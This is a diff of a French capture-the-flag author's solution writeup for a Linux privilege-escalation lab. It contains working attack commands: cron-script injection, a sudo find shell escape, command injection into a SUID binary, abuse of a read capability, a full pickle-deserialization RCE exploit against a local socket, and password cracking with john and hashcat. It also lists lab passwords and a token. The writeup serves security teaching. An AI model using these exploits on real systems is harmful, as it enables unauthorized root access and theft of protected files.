@@ -1,296 +1,191 @@
 # Operation SILENT LEDGER — Writeup complet (10/10 flags)
 
-> Document auteur — ne pas distribuer aux joueurs. Sert de correction officielle
-> et de support si un joueur conteste un flag ou reste bloqué en soutenance.
+> Document auteur — ne pas distribuer aux joueurs. Correction officielle.
+> Format des flags : `RootMeUp{...}`.
 
-## Vue d'ensemble de la chaîne d'attaque
+## Vue d'ensemble — chaîne d'attaque STRICTEMENT MONOTONE
+
+Chaque étape est un **saut latéral vers un compte précis**. Aucune étape ne
+donne root avant la toute dernière étape système (F8), et le flag 8 ne vit qu'en
+mémoire du processus orchestrateur. Les flags 9/10 restent protégés par la
+cryptographie même une fois root.
 
 ```
 j.martin (SSH, mdp fourni)
-   │  F1 lecture fichier home
-   │  F2 énumération /var/backups
-   │  F3 .bash_history -> mdp svc_backup
+   │ F1 lecture home  │ F2 énumération /var/backups  │ F3 .bash_history
    ▼
-su svc_backup
-   │  F4 cron root inscriptible -> mdp r.dubois
+svc_backup
+   │ F4 cron exécuté EN TANT QUE r.dubois (script inscriptible par le groupe)
    ▼
-su r.dubois  (groupe "analysts")
-   │  F5 SUID logviewer -> shell root partiel / lecture fichier
-   │  F6 sudo NOPASSWD find -> shell app_agent
+r.dubois
+   │ F5 sudo NOPASSWD find  (GTFOBins)  -> app_agent
    ▼
-sudo -u app_agent find . -exec /bin/sh \;
-   │  F7 binaire cap_dac_read_search -> lecture arbitraire (token + flag7)
-   │  F8 socket orchestrator + token -> pickle RCE en root -> exfiltration vault.zip
+app_agent  (membre du groupe "orch")
+   │ F6 SUID logviewer (SUID svc_orch, PAS root) -> injection -> svc_orch
    ▼
-(exécution de commandes en tant que root via l'orchestrateur)
-   │  F9 crack vault.zip (zip2john + john/hashcat, rockyou.txt) -> flag9
-   │  F10 crack pin.hash (hashcat mask 6 digits) -> déchiffrement final.gpg -> flag10
+svc_orch
+   │ F7 py-agent (cap_dac_read_search, exécutable seulement par svc_orch)
+   │    -> lecture des fichiers root (token + flag7)
+   │ F8 socket orchestrateur + token -> pickle RCE root -> flag8 EN MÉMOIRE
    ▼
-FIN
+root (uniquement via l'orchestrateur)
+   │ F9 crack vault.zip (rockyou)   │ F10 crack PIN + GPG
+   ▼  FIN
 ```
 
-Chaque étape est indépendante à valider dans CTFd — pas besoin d'attendre la fin
-de la chaîne pour scorer les premières.
+⚠️ **Runtime** : l'instance doit tourner avec `--cap-add DAC_READ_SEARCH`
+(sinon F7 est impossible — voir CTFD_SETUP.md).
 
 ---
 
 ## Flag 1 — Premiers pas (50 pts)
-
-Connexion initiale :
 ```bash
-ssh j.martin@<host> -p <port>
-# password: Welcome2024!
-```
-Puis :
-```bash
-ls -la ~
+ssh j.martin@<host> -p <port>      # password: Welcome2024!
 cat ~/welcome_note.txt
 ```
-```
-flag: MERIDIAN{f1rst_st3ps_1nt0_th3_n3tw0rk_3a1c9d}
-```
+→ `RootMeUp{f1rst_st3ps_1nt0_th3_n3tw0rk_3a1c9d}`
 
 ## Flag 2 — Fouille de printemps (75 pts)
-
-`/var/backups` contient plusieurs fichiers `.bak`. Deux sont des leurres (dump SQL
-obsolète, ancien site web), un contient le flag :
 ```bash
-grep -r "flag" /var/backups/ 2>/dev/null
-# ou : ls -la /var/backups && cat /var/backups/app_config.bak
+grep -r flag /var/backups/ 2>/dev/null   # ou : cat /var/backups/app_config.bak
 ```
-```
-flag: MERIDIAN{h1dd3n_1n_pla1n_s1ght_7b2e41}
-```
-Le fichier `app_config.bak` mentionne aussi l'existence des comptes internes
-`svc_backup`, `r.dubois`, `app_agent` — nudge naturel vers la suite.
+→ `RootMeUp{h1dd3n_1n_pla1n_s1ght_7b2e41}`
+`app_config.bak` cite aussi les comptes internes svc_backup / r.dubois / app_agent.
 
 ## Flag 3 — Mauvaise mémoire (100 pts)
-
-L'historique shell de j.martin contient une erreur de manipulation classique :
 ```bash
-cat ~/.bash_history
-```
-```
-su svc_backup
-B4ckupSvc_2023!
-```
-Le mot de passe a été tapé en pensant être au prompt `su`, et s'est retrouvé dans
-l'historique en clair. On l'utilise :
-```bash
-su svc_backup
-# password: B4ckupSvc_2023!
+cat ~/.bash_history      # contient : su svc_backup  puis  B4ckupSvc_2023!
+su svc_backup            # password: B4ckupSvc_2023!
 cat ~/flag3.txt
 ```
-```
-flag: MERIDIAN{h1st0ry_r3p3ats_1ts3lf_c48a02}
-```
+→ `RootMeUp{h1st0ry_r3p3ats_1ts3lf_c48a02}`
+Le fichier note que `cleanup.sh` est modifiable par le groupe svc_backup et que
+le cron qui l'exécute ne tourne **pas** en root.
 
-## Flag 4 — Tâche planifiée (125 pts)
-
-En tant que `svc_backup`, on regarde ce qui tourne en tâche planifiée :
+## Flag 4 — Tâche planifiée (125 pts)  — svc_backup ➜ r.dubois
 ```bash
-cat /etc/cron.d/meridian
-# * * * * * root /opt/scripts/cleanup.sh
-ls -la /opt/scripts/cleanup.sh
+cat /etc/cron.d/meridian          # * * * * * r.dubois /opt/scripts/cleanup.sh
+ls -la /opt/scripts/cleanup.sh     # root:svc_backup, group-writable
 ```
-Le script est `root:svc_backup`, mode `rwxrwxr-x` — **inscriptible par le groupe
-svc_backup**, exécuté par `root` toutes les minutes. On injecte une commande :
+Le cron exécute `cleanup.sh` **en tant que r.dubois**. On y injecte une commande
+qui lit le fichier privé de r.dubois (illisible directement en svc_backup) :
 ```bash
 cat >> /opt/scripts/cleanup.sh << 'EOF'
-cp /root/creds/r_dubois_password.txt /tmp/loot_r_dubois.txt
-chmod 644 /tmp/loot_r_dubois.txt
+cp /home/r.dubois/.password_reminder /tmp/loot4.txt 2>/dev/null
+chmod 644 /tmp/loot4.txt 2>/dev/null
 EOF
+# attendre < 60 s
+cat /tmp/loot4.txt
 ```
-On attend au plus 60 secondes que le cron root s'exécute, puis :
+→ mot de passe r.dubois `An4lyst#Secure99` + `RootMeUp{cr0n_j0bs_ar3_g0ld_9d17f3}`
 ```bash
-cat /tmp/loot_r_dubois.txt
+su r.dubois        # password: An4lyst#Secure99  (session réelle, groupes inclus)
 ```
-```
-user: r.dubois
-password: An4lyst#Secure99
+> Note conception : le cron tourne en r.dubois (pas root) ⇒ **saut latéral**,
+> jamais une RCE root gratuite.
 
-flag: MERIDIAN{cr0n_j0bs_ar3_g0ld_9d17f3}
-```
-
-## Flag 5 — Journaux confidentiels (150 pts)
-
-On récupère un shell `r.dubois` (`su r.dubois`, mot de passe ci-dessus — ce compte
-est membre du groupe `analysts`). Recherche classique des binaires SUID :
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-`/usr/local/bin/logviewer` ressort, appartenant à `root:analysts`, mode `4750`
-(setuid root, exécutable uniquement par le groupe analysts — donc accessible
-seulement maintenant qu'on est r.dubois). Analyse rapide :
-```bash
-strings /usr/local/bin/logviewer | grep -i cat
-# révèle : cat /var/log/meridian/%s.log
-```
-Le programme construit une commande shell avec l'argument fourni, sans le
-nettoyer, puis fait `setuid(0)` avant de l'exécuter via `system()`. Injection
-classique, avec un `#` pour "manger" le `.log` final ajouté par le programme :
-```bash
-/usr/local/bin/logviewer "app; cat /root/flag5.txt #"
-```
-```
-flag: MERIDIAN{su1d_b1nar13s_l13_0ft3n_2f6b58}
-```
-(Variante possible : `logviewer "app; /bin/sh #"` pour obtenir directement un
-shell root complet.)
-
-## Flag 6 — Délégation hasardeuse (175 pts)
-
-Toujours en `r.dubois` :
+## Flag 5 — Délégation hasardeuse (150 pts)  — r.dubois ➜ app_agent
 ```bash
 sudo -l
+#   (app_agent) NOPASSWD: /usr/bin/find
+sudo -u app_agent find . -exec /bin/sh \;   # GTFOBins
+whoami        # app_agent
+cat ~/flag5.txt
 ```
-```
-User r.dubois may run the following commands on this host:
-    (app_agent) NOPASSWD: /usr/bin/find
-```
-`find` est une entrée bien connue de GTFOBins pour l'escalade sudo :
-```bash
-sudo -u app_agent find . -exec /bin/sh \;
-```
-Shell obtenu en tant que `app_agent` :
-```bash
-whoami   # app_agent
-cat ~/flag6.txt
-```
-```
-flag: MERIDIAN{sud0_m1sc0nf1g_str1k3s_ag41n_e0a934}
-```
+→ `RootMeUp{sud0_m1sc0nf1g_str1k3s_ag41n_e0a934}`
 
-## Flag 7 — Pouvoirs spéciaux (200 pts)
+## Flag 6 — Journaux confidentiels (175 pts)  — app_agent ➜ svc_orch
+```bash
+find / -perm -4000 -type f 2>/dev/null
+#   /usr/local/bin/logviewer  (owner svc_orch, group orch, 4750)
+strings /usr/local/bin/logviewer | grep cat     # cat /var/log/meridian/%s.log
+```
+Injection de commande dans le SUID (le `#` mange le `.log` final). Ce binaire est
+**SUID svc_orch, pas root** :
+```bash
+logviewer "app; /bin/sh #"     # shell svc_orch (PAS root)
+id                              # euid/uid = svc_orch
+cat /home/svc_orch/flag6.txt
+```
+→ `RootMeUp{su1d_b1nar13s_l13_0ft3n_2f6b58}`
 
-En `app_agent`, on cherche des capabilities Linux au lieu de chercher encore du
-SUID :
+## Flag 7 — Pouvoirs spéciaux (200 pts)  — capability
 ```bash
 getcap -r / 2>/dev/null
-```
-```
-/usr/local/bin/py-agent cap_dac_read_search=ep
-```
-`cap_dac_read_search` permet de contourner **toutes** les vérifications de
-lecture/traversée de répertoire (y compris `/root`, normalement fermé même à la
-recherche). On l'utilise directement (le binaire est une copie de python3) :
-```bash
+#   /usr/local/bin/py-agent cap_dac_read_search=ep   (exécutable seulement par svc_orch)
 /usr/local/bin/py-agent -c 'print(open("/root/flag7.txt").read())'
 ```
-```
-flag: MERIDIAN{cap4bilit13s_ar3_p0w3r_5c2d71}
-```
-Le même mécanisme permet de récupérer le token nécessaire pour la suite :
+→ `RootMeUp{cap4bilit13s_ar3_p0w3r_5c2d71}`
+On récupère aussi le token et les infos de l'orchestrateur, puis on exfiltre les
+butins chiffrés (la capability bypasse la lecture) :
 ```bash
 /usr/local/bin/py-agent -c 'print(open("/root/.orchestrator_token").read())'
-/usr/local/bin/py-agent -c 'print(open("/root/README_orchestrator.txt").read())'
+/usr/local/bin/py-agent -c 'open("/tmp/vault.zip","wb").write(open("/root/vault/vault.zip","rb").read())'
+/usr/local/bin/py-agent -c 'open("/tmp/final.gpg","wb").write(open("/root/.encrypted/final.gpg","rb").read())'
+/usr/local/bin/py-agent -c 'open("/tmp/pin.hash","w").write(open("/root/.encrypted/pin.hash").read())'
+chmod 644 /tmp/vault.zip /tmp/final.gpg /tmp/pin.hash
 ```
-→ token : `8f3ac1e9b7d24f0aa6c9e21d4b7f9931`, et indication qu'un service
-`meridian-orchestrator` écoute sur `/run/meridian/orchestrator.sock`.
 
-## Flag 8 — L'orchestrateur (225 pts)
-
-Le service tourne en root et écoute en JSON ligne-par-ligne sur un socket UNIX.
-Commande `ping` pour confirmer :
+## Flag 8 — L'orchestrateur (225 pts)  — désérialisation ➜ root
+Le daemon (root) écoute en JSON ligne-par-ligne. `restore_config` passe un blob
+base64 à `pickle.loads()` = **RCE**. Le flag 8 n'est **pas** sur le disque : il
+est chargé en mémoire au démarrage (le fichier source est supprimé). Seule une
+exécution de code **dans** l'orchestrateur le révèle (la capability F7 ne lit pas
+la mémoire d'un autre process) :
 ```bash
-echo '{"cmd":"ping"}' | /usr/local/bin/py-agent -c '
-import socket,sys
-s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-s.connect("/run/meridian/orchestrator.sock")
-s.sendall(sys.stdin.buffer.read())
-print(s.recv(4096))'
-```
-La commande `restore_config` prend un payload base64 qui est passé tel quel à
-`pickle.loads()` — **désérialisation non sécurisée**, RCE immédiate côté serveur
-(root). Exploit :
-```bash
-mkdir -p /tmp/loot
 /usr/local/bin/py-agent << 'PYEOF'
-import pickle, base64, socket, json, os
+import pickle, base64, socket, json
+
+TOKEN = "8f3ac1e9b7d24f0aa6c9e21d4b7f9931"
 
 class Exploit:
     def __reduce__(self):
-        cmd = ("cp /root/vault/vault.zip /root/vault/flag8.txt "
-               "/root/.encrypted/final.gpg /root/.encrypted/pin.hash /tmp/loot/ ; "
-               "chmod -R 777 /tmp/loot")
-        return (os.system, (cmd,))
+        code = ("import sys,os\n"
+                "open('/tmp/f8.txt','w').write(getattr(sys.modules['__main__'],'FLAG8','?'))\n"
+                "os.chmod('/tmp/f8.txt',0o666)")
+        return (exec, (code,))
 
 payload = base64.b64encode(pickle.dumps(Exploit())).decode()
-msg = {"cmd": "restore_config",
-       "token": "8f3ac1e9b7d24f0aa6c9e21d4b7f9931",
-       "payload": payload}
-
+msg = {"cmd": "restore_config", "token": TOKEN, "payload": payload}
 s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 s.connect("/run/meridian/orchestrator.sock")
 s.sendall((json.dumps(msg) + "\n").encode())
 print(s.recv(4096))
 PYEOF
+cat /tmp/f8.txt
 ```
-```bash
-cat /tmp/loot/flag8.txt
-```
-```
-flag: MERIDIAN{0rch3str4t0r_pwn3d_88af0d}
-```
-On a maintenant, dans `/tmp/loot/` : `vault.zip`, `final.gpg`, `pin.hash`. On les
-rapatrie sur sa machine d'attaque :
-```bash
-scp -P <port> app_agent@<host>:/tmp/loot/{vault.zip,final.gpg,pin.hash} .
-```
+→ `RootMeUp{0rch3str4t0r_pwn3d_88af0d}`
 
 ## Flag 9 — Le coffre (250 pts)
-
-`vault.zip` est protégé par mot de passe. Cassage hors-ligne classique :
+Sur la machine d'attaque (après `scp` de `/tmp/vault.zip`) :
 ```bash
 zip2john vault.zip > vault.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash
-john --show vault.hash
-# password: iloveyou
-unzip -P iloveyou vault.zip
-cat flag9.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt vault.hash   # -> iloveyou
+unzip -P iloveyou vault.zip && cat flag9.txt
 ```
-```
-flag: MERIDIAN{cr4ck3d_th3_v4ult_1e39b6}
-```
-(`decoy_customers.csv` inclus dans l'archive est un leurre narratif — données
-factices, pas de flag dedans.)
+→ `RootMeUp{cr4ck3d_th3_v4ult_1e39b6}`
 
-## Flag 10 — Silent Ledger (300 pts, finale)
-
-Il reste `final.gpg` (chiffrement symétrique) et `pin.hash` (empreinte SHA-256
-d'un PIN à 6 chiffres). Attaque par masque, quasi instantanée :
+## Flag 10 — Silent Ledger (300 pts)
 ```bash
-hashcat -m 1400 -a 3 pin.hash ?d?d?d?d?d?d
-hashcat -m 1400 pin.hash --show
-# 482913:482913
-```
-Déchiffrement final :
-```bash
-gpg --batch --yes --pinentry-mode loopback --passphrase 482913 -o flag10.txt -d final.gpg
+hashcat -m 1400 -a 3 pin.hash ?d?d?d?d?d?d      # -> 482913
+gpg --batch --pinentry-mode loopback --passphrase 482913 -o flag10.txt -d final.gpg
 cat flag10.txt
 ```
-```
-MERIDIAN{0p3ration_s1l3nt_l3dg3r_c0mpl3t3_f4a217}
-```
+→ `RootMeUp{0p3ration_s1l3nt_l3dg3r_c0mpl3t3_f4a217}`
 
-**Fin de l'engagement.** 1650 points cumulés si toutes les étapes sont validées.
+**Fin de l'engagement — 1650 points.**
 
 ---
 
-## Compétences couvertes (pour la soutenance / grille d'évaluation)
-
-| Flag | Compétence red team / post-exploitation                              |
-|------|------------------------------------------------------------------------|
-| 1-2  | Reconnaissance locale, énumération de fichiers                        |
-| 3    | Récolte d'identifiants (artefacts utilisateur)                        |
-| 4    | Abus de tâches planifiées, permissions Unix                           |
-| 5    | Reverse engineering léger, injection de commande dans un SUID          |
-| 6    | Mauvaise configuration sudo / GTFOBins                                 |
-| 7    | Linux capabilities (au-delà du modèle root/non-root classique)         |
-| 8    | Exploitation applicative (désérialisation non sécurisée), dev interne  |
-| 9    | Cassage de mot de passe hors-ligne, pipeline zip2john/john             |
-| 10   | Attaque par masque hashcat, usage GPG, synthèse de la chaîne complète  |
-
-Cette diversité (system hardening, permissions Unix, capabilities, appsec sur un
-outil interne, cryptographie appliquée) justifie la répartition des points et le
-niveau attendu en 4ème année de master cybersécurité.
+## Compétences couvertes
+| Flag | Compétence |
+|------|-----------|
+| 1-2 | Reconnaissance locale, énumération de fichiers |
+| 3 | Récolte d'identifiants (artefacts utilisateur) |
+| 4 | Abus de tâche planifiée exécutée sous une autre identité |
+| 5 | Mauvaise config sudo / GTFOBins |
+| 6 | Injection de commande dans un SUID (vers un compte de service, pas root) |
+| 7 | Abus de capability Linux (lecture seule) |
+| 8 | Désérialisation non sécurisée (RCE), secret en mémoire |
+| 9 | Cassage de mot de passe hors-ligne (zip2john/john) |
+| 10 | Attaque par masque hashcat + GPG |
